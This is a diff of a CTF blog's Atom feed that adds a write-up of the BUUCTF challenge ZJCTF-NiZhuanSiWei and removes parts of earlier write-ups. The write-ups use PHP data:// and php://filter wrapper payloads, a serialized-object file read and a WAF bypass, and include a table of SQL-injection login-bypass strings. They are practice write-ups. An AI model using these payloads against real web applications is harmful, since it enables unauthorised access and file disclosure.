@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-07-07T13:32:36.235Z</updated>
+  <updated>2020-07-08T08:25:25.035Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ZJCTF-NiZhuanSiWei</title>
+    <link href="http://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/"/>
+    <id>http://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/</id>
+    <published>2020-07-08T07:42:39.000Z</published>
+    <updated>2020-07-08T08:25:25.035Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/1.png" alt="1"></p><p>首先要满足传入一个text文件，使文件内容为welcome to the zjctf，可以用php://input伪协议</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>接下来过滤了flag，并且提示有个useless.php文件，使用php://filter协议读取</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/2.png" alt="2"></p><p>base64解码得道useless.php的内容</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>然后序列化</p><pre><code>&lt;?php  class Flag{    public $file=&#39;flag.php&#39;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  } $password=new Flag();$password = serialize($password);echo $password; ?&gt;</code></pre><p>得到<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>最终payload</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>源代码得到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战2019-BuyFlag</title>
@@ -433,29 +456,6 @@
     <updated>2020-05-29T06:48:21.286Z</updated>
     
     <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="https://i.loli.net/2020/05/29/aKvcues4E6b5A2X.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p><img src="https://i.loli.net/2020/05/29/Dk9zKLiOSrx4gTG.jpg" alt="QQ截图20200529130218.jpg"></p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="https://i.loli.net/2020/05/29/UlnXEjeLzJVf2Ax.jpg" alt="QQ截图20200529130500.jpg"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p><img src="https://i.loli.net/2020/05/29/xJOg6MXqyvweoSi.png" alt="1.png"></p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="https://i.loli.net/2020/05/29/9LybDktjNHe6gJw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/05/29/xahgr3f9dWCqG4Z.png" alt="3.png"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
-    
-      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>极客大挑战2019-EasySQL</title>
-    <link href="http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/"/>
-    <id>http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</id>
-    <published>2020-05-29T04:30:36.000Z</published>
-    <updated>2020-05-29T04:41:02.697Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123305.jpg" alt="QQ截图20200529123305"></p><p>根据题目可以知道应该是个sql注入</p><p>先用万能密码尝试</p><p>用户名:admin’or 1=1#</p><p>密码:admin</p><p>登录成功，得到flag</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123625.jpg" alt="QQ截图20200529123625"></p><p>这里给出一些不同语言类型的万能密码</p><table><thead><tr><th align="left">语言</th><th>万能密码</th></tr></thead><tbody><tr><td align="left">PHP</td><td>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–</td></tr><tr><td align="left">asp aspx</td><td>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’</td></tr><tr><td align="left">jsp</td><td>1’or’1’=’1<br>admin’ or 1=1/*</td></tr></tbody></table>]]></content>
     
     <summary type="html">
     
